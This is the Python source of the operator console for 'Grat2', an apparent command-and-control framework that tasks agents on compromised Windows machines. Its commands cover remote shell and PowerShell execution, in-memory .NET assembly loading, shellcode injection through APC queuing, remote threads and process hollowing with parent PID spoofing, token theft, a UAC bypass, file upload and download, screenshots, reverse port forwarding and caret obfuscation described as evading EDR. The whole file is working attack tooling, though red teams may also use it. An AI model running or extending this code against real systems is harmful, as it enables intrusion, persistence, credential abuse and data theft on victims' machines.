import time
import os
import cmd
import base64
import encrypt
import subprocess
import re
import ntpath
import handlers
import threading
import dnslistener

class define_dns_domain():
    dnsDomainName = ""

# class for agent isolation - see handlers do_GET
class agent_iso_class():
    unique_agent_name = ""

# send tasking commands
class send_command():
    send_cmd = ""
    agent= ""

    def __init__(self,input):
        self.send_cmd=input
        self.agent=input
        super(send_command,self).__init__()

class AgentConsole(cmd.Cmd):
    #global command = ""
    prompt = 'agent> '
    agent=""
    intro = 'Type help or ? to list commands.\n'
    #agent=""

    def __init__(self,input):
        #cmd.Cmd.__init__(self)
        # https://www.programiz.com/python-programming/methods/built-in/super#:~:text=The%20super()%20builtin%20returns,Working%20with%20Multiple%20Inheritance
        self.prompt=input+'> '
        self.agent=input
        super(AgentConsole,self).__init__()

    # https://stackoverflow.com/questions/16479029/python-cmd-execute-last-command-while-prompt-and-empty-line

    def emptyline(self):
        pass

    def help_exit(self):
        print("Kill Agent")
    
    def do_exit(self,input):
        send_command.send_cmd = "exit"
        # POP Agent from Agent List
        for currentAgent in handlers.listAllAgents:
            # For loop in the list, and if the first 12 characters equals with the current agent, 
            # get the element position and pop
            if currentAgent[0:12] == agent_iso_class.unique_agent_name:
                AgentPosition = handlers.listAllAgents.index(currentAgent)
                handlers.listAllAgents.pop(AgentPosition)
        print("Agent Killed!")
        return True
    
    def do_clearTasks(self,input):
        send_command.send_cmd = ""
        print("Previous tasks command cleared!")

    def help_clearTasks(self):
        print("Clear previous tasks commands")

    def do_shell(self,input):
        send_command.send_cmd = "shell " + input
    
    def help_shell(self):
        print('Execute a shell command "shell <command>"')

    def do_sleep(self,input):
        send_command.send_cmd = "sleep " + input
    
    def help_sleep(self):
        print("Sleep <time in seconds>")

    def do_back(self,input):
        send_command.send_cmd = ""
        return True

    def help_back(self):
        print("Back to the main console")

    def do_powershell(self,input):
        send_command.send_cmd = "powershell " + input

    def help_powershell(self):
        print("Execute Unmanaged Powershell Commands: powershell <command>")

    def do_powerscript(self,input):
        #https://stackoverflow.com/questions/17359698/how-to-get-the-current-working-directory-using-python-3
        os.chdir(os.path.dirname(__file__))
        posh_script = "./powershell_scripts/" + input
        posh_data = open(posh_script, 'r').read()
        send_command.send_cmd = "powerscript " + posh_data
        
    def help_powerscript(self):
        print("Execute powershell scripts: powerscript <script.ps1>")

    def do_executeassembly(self,input):
        os.chdir(os.path.dirname(__file__))
        net_assemblies_path = "./Net_Assemblies/"
        split_input = input.split()
        checkif_file_exists = os.path.isfile(net_assemblies_path + split_input[0])
        if checkif_file_exists == True:
            assembly_path = net_assemblies_path + split_input[0]
            assembly_bytes = open(assembly_path, 'rb').read()
            B64_bytes = base64.b64encode(assembly_bytes)
            # Convert bytes to string
            Decoded_Bytes = str(B64_bytes.decode('utf8'))
            for i,val in enumerate(split_input):
                if i==0:
                    continue
                Decoded_Bytes+= " " + val
            send_command.send_cmd = "executeassembly " + Decoded_Bytes
        else:
            print("The file '{0}' does not exists in the '{1}' directory.".format(split_input[0],format(net_assemblies_path)))
            print("Available .NET Assemblies are:\n")
            print(os.listdir(net_assemblies_path))

    def help_executeassembly(self):
        print("Execute .NET Assembly: executeassembly <path> <argument>")

    def do_ps(self,input):
        send_command.send_cmd = "ps "

    def help_ps(self):
        print("List running process: ps")

    def do_pwd(self,input):
        send_command.send_cmd = "pwd "

    def help_pwd(self):
        print("Get Current Directory: pwd")

    def do_ls(self,input):
        if (len(input) == 0):
            send_command.send_cmd = "ls "
        else:
            # replace space with +
            replace_input_quotes = input.replace('"','')
            replace_spaces = replace_input_quotes.replace(' ','+')
            send_command.send_cmd = "ls " + replace_spaces

    def help_ls(self):
        print("Get Directory LIsting: ls <path>")

    def do_injectapc(self,input):
        os.chdir(os.path.dirname(__file__))
        replace_input_quotes = input.replace('"','')
        replace_spaces = replace_input_quotes.replace(' ','+')
        output_shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.txt"
        shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.bin"
        Convert_to_Shellcode = subprocess.Popen("cat " + shellcode_path + " | gzip -f | base64 -w 0 > " + output_shellcode_path,stdin=subprocess.PIPE, shell=True)
        Convert_to_Shellcode.communicate()
        assembly_bytes = open(output_shellcode_path, 'r').read()
        send_command.send_cmd = "injectapc " + assembly_bytes + " " + replace_spaces

    def help_injectapc(self):
        print("QueueUserAPC - Inject GRAT2 into a process. (NOTE: Parent Spoofing is not applied for this command. The process will be spawned under the current process). e.g: injectapc c:\windows\system32\notepad.exe")

    def do_injectcrt(self,input):
        os.chdir(os.path.dirname(__file__))
        output_shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.txt"
        shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.bin"
        Convert_to_Shellcode = subprocess.Popen("cat " + shellcode_path + " | gzip -f | base64 -w 0 > " + output_shellcode_path,stdin=subprocess.PIPE, shell=True)
        Convert_to_Shellcode.communicate()
        assembly_bytes = open(output_shellcode_path, 'r').read()
        send_command.send_cmd = "injectcrt " + assembly_bytes + " " + input

    def help_injectcrt(self):
        print("Create Remote Thread - GRAT2 into a new process: inject <pid>.")

    def do_injectppidapc(self,input):
        os.chdir(os.path.dirname(__file__))
        replace_input_quotes = input.replace('"','')
        replace_spaces = replace_input_quotes.replace(' ','+')
        output_shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.txt"
        shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.bin"
        Convert_to_Shellcode = subprocess.Popen("cat " + shellcode_path + " | gzip -f | base64 -w 0 > " + output_shellcode_path,stdin=subprocess.PIPE, shell=True)
        Convert_to_Shellcode.communicate()
        assembly_bytes = open(output_shellcode_path, 'r').read()
        send_command.send_cmd = "injectppidapc " + assembly_bytes + " " + replace_spaces

    def help_injectppidapc(self):
        print("QueueUserAPC with Parent Spoofing and Mitigation Policy - Inject GRAT2 into a process. e.g: injectapc c:\\windows\\system32\\notepad.exe")

    def do_processhollow(self,input):
        os.chdir(os.path.dirname(__file__))
        replace_input_quotes = input.replace('"','')
        replace_spaces = replace_input_quotes.replace(' ','+')
        output_shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.txt"
        shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.bin"
        Convert_to_Shellcode = subprocess.Popen("cat " + shellcode_path + " | gzip -f | base64 -w 0 > " + output_shellcode_path,stdin=subprocess.PIPE, shell=True)
        Convert_to_Shellcode.communicate()
        assembly_bytes = open(output_shellcode_path, 'r').read()
        send_command.send_cmd = "processhollow " + assembly_bytes + " " + replace_spaces

    def help_processhollow(self):
        print("Process Hollowing - Inject GRAT2 into a process. (NOTE: Parent Spoofing is not applied for this command. The process will be spawned under the current process). e.g: processhollow c:\windows\system32\notepad.exe")

    def do_ppid_processhollow(self,input):
        os.chdir(os.path.dirname(__file__))
        replace_input_quotes = input.replace('"','')
        replace_spaces = replace_input_quotes.replace(' ','+')
        output_shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.txt"
        shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.bin"
        Convert_to_Shellcode = subprocess.Popen("cat " + shellcode_path + " | gzip -f | base64 -w 0 > " + output_shellcode_path,stdin=subprocess.PIPE, shell=True)
        Convert_to_Shellcode.communicate()
        assembly_bytes = open(output_shellcode_path, 'r').read()
        send_command.send_cmd = "ppid_processhollow " + assembly_bytes + " " + replace_spaces

    def help_ppid_processhollow(self):
        print("Process Hollowing with Parent Spoofing and Mitigation Policy- Inject GRAT2 into a process. e.g: ppid_processhollow c:\\windows\\system32\\notepad.exe")

    def do_dynamic_injectcrt(self,input):
        os.chdir(os.path.dirname(__file__))
        output_shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.txt"
        shellcode_path = "./GRAT2_Shellcodes/grat2shellcode.bin"
        Convert_to_Shellcode = subprocess.Popen("cat " + shellcode_path + " | gzip -f | base64 -w 0 > " + output_shellcode_path,stdin=subprocess.PIPE, shell=True)
        Convert_to_Shellcode.communicate()
        assembly_bytes = open(output_shellcode_path, 'r').read()
        send_command.send_cmd = "dynamic_injectcrt " + assembly_bytes + " " + input

    def help_dynamic_injectcrt(self):
        print("Dynamic Create Remote Thread Injection- GRAT2 into a new process: inject <pid>.")


    def do_pid(self,input):
        send_command.send_cmd = "pid "

    def help_pid(self):
        print("Get Current Directory Process ID: pid")

    def do_run(self,input):
        replace_spaces = input.replace(' ','+')
        send_command.send_cmd = "run " + replace_spaces
    
    def help_run(self):
        print('Execute a parent PID Spoofing (explorer.exe is the parent) command "run <command>"')

    def do_caretrun(self,input):
        replace_spaces = input.replace(' ','+')
        send_command.send_cmd = "caretrun " + replace_spaces
    
    def help_caretrun(self):
        print('Execute a parent PID Spoofing (explorer.exe is the parent) cmd command with caret (^): "caretrun ipconfig" will be executed as cmd.exe /c ^i^p^c^o^n^f^i^g (This may evade some defenses like EDR) ')

    def do_cd(self,input):
        replace_input_quotes = input.replace('"','')
        replace_spaces = replace_input_quotes.replace(' ','+')
        send_command.send_cmd = "cd " + replace_spaces

    def help_cd(self):
        print("Change Current Directory: cd <path>")

    # todo, upload from any local directory    
    def do_upload(self,input):
        os.chdir(os.path.dirname(__file__))
        upload_path = "./Data/"
        split_input = input.split(' ',1) # split only the first two spaces
        checkif_file_exists = os.path.isfile(upload_path + split_input[0])
        if checkif_file_exists == True:
            assembly_path = upload_path + split_input[0]
            assembly_bytes = open(assembly_path, 'rb').read()
            B64_bytes = base64.b64encode(assembly_bytes)
            # Convert bytes to string
            Decoded_Bytes = str(B64_bytes.decode('utf8'))
            replace_remotePath = split_input[1].replace('"','')
            replace_spaces = replace_remotePath.replace(' ','+')
            send_command.send_cmd = "upload " + Decoded_Bytes + " " + split_input[0] + " " + replace_spaces
        else:
            print("The file '{0}' does not exists in the '{1}' directory.".format(split_input[0],format(upload_path)))
            print("Available files to upload are:\n")
            print(os.listdir(upload_path))

    def help_upload(self):
        print("Upload files from local to remote machine: upload <localfile> <remote path>")

    def do_download(self,input):
        replace_remotePath = input.replace('"','')
        replace_spaces = replace_remotePath.replace(' ','+')
        send_command.send_cmd = "download " + replace_spaces

    def help_download(self):
        print("Download filr from compromised machine")

    def do_screenshot(self,input):
        send_command.send_cmd = "screenshot "

    def help_screenshot(self):
        print("Take a screenshot.")

    def do_whoami(self,input):
        send_command.send_cmd = "whoami "

    def help_whoami(self):
        print("Run whoami")

    def do_hostname(self,input):
        send_command.send_cmd = "hostname "

    def help_hostname(self):
        print("Run hostname")

    def do_domain(self,input):
        send_command.send_cmd = "domain "

    def help_domain(self):
        print("Run domain")

    def do_rportfwd(self,input):
        send_command.send_cmd = "rportfwd " + input

    def help_rportfwd(self):
        print("Usage: rportfwd localport RemoteServer RemoteServerPort")

    def do_stealtoken(self,input):
        send_command.send_cmd = "stealtoken " + input

    def help_stealtoken(self):
        print("stealtoken <pid>.")

    def do_revtoself(self,input):
        send_command.send_cmd = "revtoself "

    def help_revtoself(self):
        print("Revert back the initial token")

    def do_maketoken(self,input):
        split_credsinput = input.split()
        send_command.send_cmd = "maketoken " + split_credsinput[0] + " " + split_credsinput[1]

    def help_maketoken(self):
        print("Create a user token base on the provided credentials: maketoken DOMAIN\\Username Password")

    def do_uac_diskcleanup(self,input):
        send_command.send_cmd = "uac " + input

    def help_uac_diskcleanup(self):
        print("SilentCleanup Technique. Upload dll into the affected machine and run: e.g uac_diskcleanup c:\\temp\\demo.dll,DLLMain (avoid spaces in the directory path))")

    def do_localip(self,input):
        send_command.send_cmd = "localip "

    def help_localip(self):
        print("Get the local IP Address of the machine")

class Console(cmd.Cmd):
    prompt = 'Grat2> '
    intro = 'Type help or ? to list commands.\n'

    def __init__(self):
        #cmd.Cmd.__init__(self)
        super(Console,self).__init__()

    def emptyline(self):
        pass

    def do_startdns(self, input):
        global startListener
        #define_dns_domain.dnsDomainName = input
        startListener = threading.Thread(target=dnslistener.StartDNSListener, args=[self])
        startListener.start()
        print("DNS Listener Started!")
        print("*PLEASE NOTE*")
        print("Injections, executeassembly and Upload (More than 255 Chars) functionalities are not working at the moment.")

    def help_startdns(self):
        print("Start DNS Listener: startdns <dns server>")

    def do_exit(self, input):
        print("Byee!!")
        os._exit(0)

    def help_exit(self):
        print('Exit Console!!!')

    def help_listagents(self):
        print("List Active Agents: listagents")

    def do_listagents(self, input):
        print("{:17} {:12} {:10} {:12} {:10}".format("Agent Name", "Hostname", "Username", "IP Address", "Listener"))
        print("===============================================================")
        for i in handlers.listAllAgents:
            print(i)
            print("---------------------------------------------------------------")

    def help_interact(self):
        print("Interact with the agent: interact <agent name>")

    def do_interact(self,input):
        # clean the previous tasks if any, especially the exit
        send_command.send_cmd = ""
        agent_iso_class.unique_agent_name = input
        interact_agent = AgentConsole(input)
        interact_agent.cmdloop()